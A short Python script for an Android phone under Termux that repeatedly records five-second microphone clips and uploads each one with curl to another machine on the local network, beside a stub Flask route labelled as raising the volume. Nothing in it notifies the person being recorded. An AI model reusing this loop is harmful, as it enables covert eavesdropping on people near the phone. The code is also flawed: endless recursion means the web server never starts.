import os, time
from flask import Flask

def rec():
  # Записывание микрофона в аудиофайл (audio.wav) (5 с)
  os.system('termux-microphone-record -f audio.wav -l 5')
  time.sleep(5.5)

  os.system('curl -X POST -F "file=@audio.wav" http://192.168.1.65:8080')
  os.system('rm audio.wav')
  rec()

app = Flask(__name__)

@app.route('/volume_up')
def volume_up():
    print('громкость повышена')

if __name__ == '__main__':
    rec()
    app.run(port=80)
